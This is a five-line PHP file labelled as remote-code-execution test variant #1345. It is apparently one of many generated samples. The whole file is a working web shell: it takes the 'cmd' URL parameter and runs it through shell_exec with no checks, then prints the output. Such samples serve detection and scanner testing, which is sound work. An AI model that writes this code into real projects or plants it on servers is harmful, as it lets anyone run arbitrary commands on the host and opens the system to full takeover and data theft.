<?php
// RCE test variation #1345
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>